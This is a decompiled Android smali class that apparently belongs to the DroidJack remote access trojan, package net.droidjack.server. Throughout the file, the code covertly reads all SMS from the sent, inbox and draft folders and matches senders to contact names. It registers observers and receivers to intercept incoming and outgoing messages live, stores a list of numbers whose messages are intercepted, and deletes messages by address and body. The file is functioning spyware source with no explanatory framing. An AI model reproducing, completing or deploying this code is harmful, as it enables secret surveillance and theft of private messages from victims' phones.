.class public Lnet/droidjack/server/bt;
.super Landroid/database/ContentObserver;


# static fields
.field protected static a:Z

.field protected static b:Z

.field private static d:Ljava/lang/String;

.field private static i:Ljava/lang/String;


# instance fields
.field private c:Landroid/content/Context;

.field private e:Z

.field private f:Z

.field private g:Z

.field private final h:I

.field private j:Lnet/droidjack/server/bx;


# direct methods
.method static constructor <clinit>()V
    .locals 2

    const/4 v1, 0x0

    const-string v0, ""

    sput-object v0, Lnet/droidjack/server/bt;->d:Ljava/lang/String;

    sput-boolean v1, Lnet/droidjack/server/bt;->a:Z

    sput-boolean v1, Lnet/droidjack/server/bt;->b:Z

    return-void
.end method

.method public constructor <init>(Landroid/content/Context;Landroid/os/Handler;)V
    .locals 1

    const/4 v0, 0x0

    invoke-direct {p0, p2}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    iput-boolean v0, p0, Lnet/droidjack/server/bt;->e:Z

    iput-boolean v0, p0, Lnet/droidjack/server/bt;->f:Z

    iput-boolean v0, p0, Lnet/droidjack/server/bt;->g:Z

    const/16 v0, 0x4c9

    iput v0, p0, Lnet/droidjack/server/bt;->h:I

    iput-object p1, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-static {}, Lnet/droidjack/server/ae;->a()V

    return-void
.end method

.method private a(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)I
    .locals 4

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "address=? and body=?"

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    aput-object p2, v2, v3

    const/4 v3, 0x1

    aput-object p3, v2, v3

    invoke-virtual {v0, p1, v1, v2}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    move-result v0

    return v0
.end method

.method static synthetic a(Lnet/droidjack/server/bt;Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)I
    .locals 1

    invoke-direct {p0, p1, p2, p3}, Lnet/droidjack/server/bt;->a(Landroid/net/Uri;Ljava/lang/String;Ljava/lang/String;)I

    move-result v0

    return v0
.end method

.method private a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 6
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    new-instance v0, Lnet/droidjack/server/bu;

    move-object v1, p0

    move-object v2, p1

    move-object v3, p4

    move-object v4, p3

    move-object v5, p2

    invoke-direct/range {v0 .. v5}, Lnet/droidjack/server/bu;-><init>(Lnet/droidjack/server/bt;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    invoke-virtual {v0}, Lnet/droidjack/server/bu;->start()V

    return-void
.end method


# virtual methods
.method public a(Ljava/lang/String;)Ljava/lang/String;
    .locals 6

    const/4 v3, 0x0

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    sget-object v1, Landroid/provider/ContactsContract$PhoneLookup;->CONTENT_FILTER_URI:Landroid/net/Uri;

    invoke-static {p1}, Landroid/net/Uri;->encode(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/net/Uri;->withAppendedPath(Landroid/net/Uri;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v5, "display_name"

    aput-object v5, v2, v4

    move-object v4, v3

    move-object v5, v3

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v0

    if-nez v0, :cond_1

    :cond_0
    :goto_0
    return-object v3

    :cond_1
    invoke-interface {v0}, Landroid/database/Cursor;->moveToFirst()Z

    move-result v1

    if-eqz v1, :cond_2

    const-string v1, "display_name"

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v1

    invoke-interface {v0, v1}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    :cond_2
    if-eqz v0, :cond_0

    invoke-interface {v0}, Landroid/database/Cursor;->isClosed()Z

    move-result v1

    if-nez v1, :cond_0

    invoke-interface {v0}, Landroid/database/Cursor;->close()V

    goto :goto_0
.end method

.method protected a()V
    .locals 7

    const/4 v2, 0x0

    new-instance v6, Lnet/droidjack/server/ag;

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v6, v0}, Lnet/droidjack/server/ag;-><init>(Landroid/content/Context;)V

    invoke-virtual {v6}, Lnet/droidjack/server/ag;->b()V

    const-string v0, "content://sms/sent"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_0

    :goto_0
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    return-void

    :cond_1
    const-string v0, "body"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v0, "address"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    const-string v0, "date"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p0, v1}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_2

    move-object v0, v1

    :cond_2
    invoke-virtual {v6, v1, v0, v3, v4}, Lnet/droidjack/server/ag;->b(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method protected b()V
    .locals 7

    const/4 v2, 0x0

    new-instance v6, Lnet/droidjack/server/ag;

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v6, v0}, Lnet/droidjack/server/ag;-><init>(Landroid/content/Context;)V

    invoke-virtual {v6}, Lnet/droidjack/server/ag;->a()V

    const-string v0, "content://sms/inbox"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_0

    :goto_0
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    return-void

    :cond_1
    const-string v0, "body"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v0, "address"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_2

    move-object v0, v1

    :cond_2
    const-string v4, "date"

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v6, v1, v0, v3, v4}, Lnet/droidjack/server/ag;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method protected b(Ljava/lang/String;)[B
    .locals 4

    :try_start_0
    sget-boolean v0, Lnet/droidjack/server/bt;->a:Z

    if-nez v0, :cond_3

    sget-boolean v0, Lnet/droidjack/server/bt;->b:Z

    if-nez v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2, p0}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    :cond_0
    sput-object p1, Lnet/droidjack/server/bt;->i:Ljava/lang/String;

    sget-object v0, Lnet/droidjack/server/bt;->i:Ljava/lang/String;

    if-nez v0, :cond_1

    sget-object v0, Lnet/droidjack/server/bt;->i:Ljava/lang/String;

    const-string v1, ""

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_2

    :cond_1
    new-instance v0, Lnet/droidjack/server/bx;

    sget-object v1, Lnet/droidjack/server/bt;->i:Ljava/lang/String;

    invoke-direct {v0, v1}, Lnet/droidjack/server/bx;-><init>(Ljava/lang/String;)V

    iput-object v0, p0, Lnet/droidjack/server/bt;->j:Lnet/droidjack/server/bx;

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    iget-object v1, p0, Lnet/droidjack/server/bt;->j:Lnet/droidjack/server/bx;

    new-instance v2, Landroid/content/IntentFilter;

    const-string v3, "android.provider.Telephony.SMS_RECEIVED"

    invoke-direct {v2, v3}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v1, v2}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    :cond_2
    const/4 v0, 0x1

    sput-boolean v0, Lnet/droidjack/server/bt;->a:Z

    new-instance v0, Lnet/droidjack/server/by;

    iget-object v1, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v0, v1}, Lnet/droidjack/server/by;-><init>(Landroid/content/Context;)V

    const-string v1, "SMS_LIVE"

    const-string v2, "true"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Lnet/droidjack/server/by;

    iget-object v1, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v0, v1}, Lnet/droidjack/server/by;-><init>(Landroid/content/Context;)V

    const-string v1, "INTERCEPT_INCOMING_SMS_NOS"

    sget-object v2, Lnet/droidjack/server/bt;->i:Ljava/lang/String;

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_3
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected c()V
    .locals 7

    const/4 v2, 0x0

    new-instance v6, Lnet/droidjack/server/ag;

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v6, v0}, Lnet/droidjack/server/ag;-><init>(Landroid/content/Context;)V

    invoke-virtual {v6}, Lnet/droidjack/server/ag;->c()V

    const-string v0, "content://sms/draft"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v0

    if-lez v0, :cond_0

    :goto_0
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_1

    :cond_0
    return-void

    :cond_1
    const-string v0, "body"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v0, "address"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_2

    move-object v0, v1

    :cond_2
    const-string v4, "date"

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v4

    invoke-interface {v2, v4}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v6, v1, v0, v3, v4}, Lnet/droidjack/server/ag;->c(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method

.method protected c(Ljava/lang/String;)[B
    .locals 2

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/bv;

    invoke-direct {v1, p0, p1}, Lnet/droidjack/server/bv;-><init>(Lnet/droidjack/server/bt;Ljava/lang/String;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected d()[B
    .locals 3

    :try_start_0
    sget-boolean v0, Lnet/droidjack/server/bt;->a:Z

    if-eqz v0, :cond_2

    sget-boolean v0, Lnet/droidjack/server/bt;->b:Z

    if-nez v0, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-virtual {v0, p0}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    :cond_0
    iget-object v0, p0, Lnet/droidjack/server/bt;->j:Lnet/droidjack/server/bx;

    if-eqz v0, :cond_1

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    iget-object v1, p0, Lnet/droidjack/server/bt;->j:Lnet/droidjack/server/bx;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :cond_1
    const/4 v0, 0x0

    sput-boolean v0, Lnet/droidjack/server/bt;->a:Z

    new-instance v0, Lnet/droidjack/server/by;

    iget-object v1, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v0, v1}, Lnet/droidjack/server/by;-><init>(Landroid/content/Context;)V

    const-string v1, "SMS_LIVE"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lnet/droidjack/server/by;->a(Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    const-string v0, "Ack"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method protected d(Ljava/lang/String;)[B
    .locals 2

    :try_start_0
    invoke-static {}, Ljava/util/concurrent/Executors;->newSingleThreadExecutor()Ljava/util/concurrent/ExecutorService;

    move-result-object v0

    new-instance v1, Lnet/droidjack/server/bw;

    invoke-direct {v1, p0, p1}, Lnet/droidjack/server/bw;-><init>(Lnet/droidjack/server/bt;Ljava/lang/String;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, [B
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :goto_0
    return-object v0

    :catch_0
    move-exception v0

    invoke-static {v0}, Lnet/droidjack/server/ae;->a(Ljava/lang/Throwable;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    const-string v0, "NAck"

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    goto :goto_0
.end method

.method public deliverSelfNotifications()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public onChange(Z)V
    .locals 8

    const/4 v2, 0x0

    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    const-string v0, "content://sms"

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    move-object v3, v2

    move-object v4, v2

    move-object v5, v2

    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v2

    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    const-string v0, "type"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v0, "_id"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v4

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    invoke-virtual {v0, v3}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    new-instance v5, Lnet/droidjack/server/bm;

    iget-object v0, p0, Lnet/droidjack/server/bt;->c:Landroid/content/Context;

    invoke-direct {v5, v0}, Lnet/droidjack/server/bm;-><init>(Landroid/content/Context;)V

    sget-object v0, Lnet/droidjack/server/bt;->d:Ljava/lang/String;

    invoke-virtual {v4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    const-string v0, "4"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_2

    const-string v0, "body"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v6

    const-string v0, "address"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_0

    move-object v0, v1

    :cond_0
    sget-boolean v7, Lnet/droidjack/server/bt;->b:Z

    if-eqz v7, :cond_1

    invoke-virtual {v5, v1, v0, v6}, Lnet/droidjack/server/bm;->b(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    sget-boolean v7, Lnet/droidjack/server/bt;->a:Z

    if-eqz v7, :cond_2

    const-string v7, "Outbox"

    invoke-direct {p0, v7, v1, v0, v6}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    const-string v0, "1"

    invoke-virtual {v3, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_5

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "In here!! Inform="

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    sget-boolean v3, Lnet/droidjack/server/bt;->a:Z

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    const-string v0, "body"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    const-string v0, "address"

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v0

    invoke-interface {v2, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p0, v1}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-nez v0, :cond_3

    move-object v0, v1

    :cond_3
    sget-boolean v2, Lnet/droidjack/server/bt;->b:Z

    if-eqz v2, :cond_4

    invoke-virtual {v5, v1, v0, v3}, Lnet/droidjack/server/bm;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_4
    sget-boolean v2, Lnet/droidjack/server/bt;->a:Z

    if-eqz v2, :cond_5

    const-string v2, "Inbox"

    invoke-direct {p0, v2, v1, v0, v3}, Lnet/droidjack/server/bt;->a(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_5
    sput-object v4, Lnet/droidjack/server/bt;->d:Ljava/lang/String;

    :cond_6
    return-void
.end method
